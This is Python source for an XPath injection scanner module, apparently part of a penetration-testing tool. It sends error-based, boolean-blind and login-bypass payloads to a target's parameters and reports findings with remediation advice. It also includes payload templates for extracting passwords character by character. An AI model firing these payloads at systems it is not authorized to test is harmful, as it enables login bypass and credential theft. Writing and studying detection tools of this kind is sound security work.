"""
DS1 Hunter - XPath Injection Module
DigitalSecurity1 - "Hunt. Chain. Prove."

XPath injection occurs when user input is embedded into XPath queries
without sanitisation. An attacker can:
  - Bypass authentication (login bypass)
  - Extract arbitrary XML document content (data exfiltration)
  - Enumerate document structure (blind XPath via boolean/error analysis)

Coverage:
  - Error-based detection (malformed XPath syntax triggers parse error)
  - Boolean-based blind XPath (differential response analysis)
  - Auth bypass payloads (OR 1=1 equivalents in XPath)
  - String extraction via substring() / string-length()
  - Union-trick extraction using contains() / starts-with()
  - Double-quoted and single-quoted variants
"""

import asyncio
import logging
import re
import uuid
from typing import Any, Dict, List, Optional, Tuple
from urllib.parse import urlencode, urlparse, parse_qs, urljoin

import aiohttp

logger = logging.getLogger("ds1hunter.xpath_injection")

# ── Error signatures ──────────────────────────────────────────────────────────

_XPATH_ERROR_SIG = re.compile(
    r'XPathException|XPath.*error|javax\.xml\.xpath|'
    r'SimpleXMLElement|DOMXPath|xpath.*failed|'
    r'invalid.*xpath|xpath.*syntax|'
    r'org\.apache\.xpath|net\.sf\.saxon|'
    r'System\.Xml\.XPath|XPathNavigator|'
    r'xmldb:exists|xquery.*error|'
    r'FLWOR.*expression|XQuery.*compilation|'
    r"unterminated string|'[^']*$|\"[^\"]*$",
    re.I | re.S,
)

# ── Auth bypass payloads ─────────────────────────────────────────────────────

_AUTH_BYPASS_PAYLOADS = [
    # Single quote context
    ("' or '1'='1", "' or '1'='1"),
    ("' or 1=1 or '1'='1", "pass"),
    ("admin' or '1'='1", "anything"),
    ("' or position()=1 or '1'='2", "pass"),
    ("'] | //* | //x['", "pass"),
    # Double quote context
    ('" or "1"="1', "pass"),
    ('admin" or "1"="1', "pass"),
    # Comment injection (XPath has no comments, but some parsers tolerate)
    ("' or 1=1", "pass"),
    ("x' or name()='x' or 'x'='y", "pass"),
    # Full bypass
    ("' or true() or '", "pass"),
    ("' or count(/*)>0 or '", "pass"),
    ("' or string-length(name(/*[1]))>0 or '", "pass"),
]

# ── Error trigger payloads ────────────────────────────────────────────────────

_ERROR_PAYLOADS = [
    "'",
    '"',
    "' )",
    '" )',
    "']",
    '"]',
    "' or 'a'='a",
    "' and 'a'='a",
    "') or ('a'='a",
    "x' or 1=1 or 'x'='y",
    "' or position()=1 and '1'='1",
    # XPath function injection
    "' and substring(//user[1]/username,1,1)='a' and '1'='1",
    "' and count(//user)>0 and '1'='1",
    "' or count(//*)>0 or '1'='2",
]

# ── Boolean true/false pairs for blind XPath ─────────────────────────────────

_BOOL_PAIRS: List[Tuple[str, str]] = [
    ("' and '1'='1", "' and '1'='2"),
    ("' or '1'='1", "' or '1'='2"),
    ("1' and 1=1 and '1'='1", "1' and 1=2 and '1'='1"),
    ("' and position()=1 or '1'='2", "' and position()=2 or '1'='2"),
    ("' and true() or '1'='2", "' and false() or '1'='2"),
    ("' and count(/*)>=1 or '1'='2", "' and count(/*)=0 or '1'='2"),
]

# ── Data extraction payloads (blind enumeration) ──────────────────────────────

_EXTRACTION_PAYLOADS = [
    # Root element name character extraction
    "' and substring(name(/*[1]),1,1)='{char}' and '1'='1",
    # Node count
    "' and count(//*)>{n} and '1'='1",
    # Username/password field guessing
    "' and string-length(//user[1]/password)>{n} and '1'='1",
    "' and substring(//user[1]/password,1,1)='{char}' and '1'='1",
    "' and contains(//user[1]/password,'{char}') and '1'='1",
    # Generic value extraction
    "' and starts-with(normalize-space(//node()[1]),'a') and '1'='1",
]

# ── XPath union / wildcard extraction ────────────────────────────────────────

_UNION_PAYLOADS = [
    "' | //*[1]",
    "' | //user",
    "' | //password",
    "'] | //*['1'='1",
    "x'] | //*[contains(.,'') or 'x'='y",
]


class XPathInjectionScanner:
    """
    Detects XPath injection in GET/POST parameters and JSON body fields.

    Detection stages:
    1. Error-based: malformed XPath triggers a server error with XPath keywords
    2. Boolean-based: differential response lengths/content between true/false payloads
    3. Auth bypass: login endpoints may return different content with bypass payloads
    """

    def __init__(
        self,
        target: str,
        session_id: str,
        auth_headers: Optional[Dict[str, str]] = None,
    ):
        self.target       = target.rstrip('/')
        self.session_id   = session_id
        self.auth_headers = auth_headers or {}
        self.findings: List[Dict[str, Any]] = []

    async def scan_url(
        self,
        session: aiohttp.ClientSession,
        url: str,
        method: str = 'GET',
        body: Optional[Dict] = None,
    ) -> List[Dict[str, Any]]:
        findings = []
        parsed   = urlparse(url)
        qs       = parse_qs(parsed.query, keep_blank_values=True)

        # Gather injection points
        params = list(qs.keys())
        if body and isinstance(body, dict):
            params += list(body.keys())

        for param in params:
            f = await self._test_param(session, url, method, param, qs, body or {})
            if f:
                findings.append(f)
        return findings

    async def _test_param(
        self,
        session: aiohttp.ClientSession,
        url: str,
        method: str,
        param: str,
        qs: Dict,
        body: Dict,
    ) -> Optional[Dict[str, Any]]:

        # ── Baseline ──────────────────────────────────────────────────────────
        try:
            baseline_resp = await self._request(session, method, url, qs, body, param, 'baseline')
            if baseline_resp is None:
                return None
            baseline_status, baseline_body = baseline_resp
        except Exception:
            return None

        # ── Stage 1: Error-based ─────────────────────────────────────────────
        for payload in _ERROR_PAYLOADS:
            try:
                resp = await self._request(session, method, url, qs, body, param, payload)
                if resp is None:
                    continue
                status, rbody = resp
                if _XPATH_ERROR_SIG.search(rbody) and not _XPATH_ERROR_SIG.search(baseline_body):
                    return self._make_finding(
                        url, param, payload, rbody,
                        'XPath Injection (Error-Based)',
                        'critical',
                        'Server returned an XPath error on malformed input, confirming XPath injection.',
                    )
            except Exception:
                continue

        # ── Stage 2: Boolean-based blind ─────────────────────────────────────
        for true_pl, false_pl in _BOOL_PAIRS:
            try:
                true_resp  = await self._request(session, method, url, qs, body, param, true_pl)
                false_resp = await self._request(session, method, url, qs, body, param, false_pl)
                if true_resp is None or false_resp is None:
                    continue
                _, true_body  = true_resp
                _, false_body = false_resp
                # Meaningful size difference = boolean-injectable
                diff = abs(len(true_body) - len(false_body))
                base_len = max(len(baseline_body), 1)
                if diff > 50 and diff / base_len > 0.05:
                    return self._make_finding(
                        url, param, true_pl, true_body,
                        'XPath Injection (Boolean Blind)',
                        'high',
                        f'Response size differs by {diff} bytes between XPath true/false conditions '
                        f'({len(true_body)} vs {len(false_body)} bytes). '
                        'Confirms boolean-injectable XPath expression.',
                    )
            except Exception:
                continue

        # ── Stage 3: Auth bypass (only on likely login endpoints) ─────────────
        if any(k in url.lower() for k in ('login', 'auth', 'signin', 'session', 'token')):
            for user_pl, pass_pl in _AUTH_BYPASS_PAYLOADS[:5]:
                try:
                    bypass_qs   = dict(qs)
                    bypass_body = dict(body)
                    all_params  = list(bypass_qs.keys()) + list(bypass_body.keys())
                    for p in all_params[:2]:  # inject into first two params
                        if p in bypass_qs:
                            bypass_qs[p] = [user_pl]
                        else:
                            bypass_body[p] = user_pl
                    resp = await self._request(
                        session, method, url, bypass_qs, bypass_body, param, user_pl
                    )
                    if resp is None:
                        continue
                    status, rbody = resp
                    if status in (200, 302) and status != baseline_status:
                        return self._make_finding(
                            url, param, user_pl, rbody,
                            'XPath Injection - Authentication Bypass',
                            'critical',
                            'XPath auth bypass payload returned a different HTTP status than baseline, '
                            'indicating the XPath query was manipulated to return a true result.',
                        )
                except Exception:
                    continue

        return None

    async def _request(
        self,
        session: aiohttp.ClientSession,
        method: str,
        url: str,
        qs: Dict,
        body: Dict,
        param: str,
        payload: str,
    ) -> Optional[Tuple[int, str]]:
        injected_qs   = dict(qs)
        injected_body = dict(body)
        if param in injected_qs:
            injected_qs[param] = [payload]
        else:
            injected_body[param] = payload

        parsed = urlparse(url)
        from urllib.parse import urlencode
        new_query = urlencode({k: v[0] if isinstance(v, list) else v
                               for k, v in injected_qs.items()})
        injected_url = parsed._replace(query=new_query).geturl()

        timeout = aiohttp.ClientTimeout(total=15)
        try:
            if method.upper() == 'GET':
                async with session.get(injected_url, timeout=timeout, allow_redirects=False) as r:
                    return r.status, await r.text(errors='replace')
            else:
                async with session.post(injected_url, data=injected_body, timeout=timeout,
                                        allow_redirects=False) as r:
                    return r.status, await r.text(errors='replace')
        except Exception as e:
            logger.debug("[XPath] Request error: %s", e)
            return None

    def _make_finding(
        self,
        url: str,
        param: str,
        payload: str,
        response_excerpt: str,
        title: str,
        severity: str,
        detail: str,
    ) -> Dict[str, Any]:
        return {
            'type':      'xpath_injection',
            'title':     title,
            'severity':  severity,
            'endpoint':  url,
            'evidence': {
                'parameter':         param,
                'payload':           payload,
                'response_excerpt':  response_excerpt[:500],
            },
            'confirmed': True,
            'detail':    detail,
            'remediation': (
                'Use parameterized XPath queries or XQuery variables instead of '
                'string concatenation. Validate and allowlist all user input before '
                'including it in XPath expressions. Consider using a dedicated XML '
                'database with prepared statement support.'
            ),
            'poc': (
                f"curl -X GET '{url}' --data-urlencode '{param}={payload}'"
            ),
        }
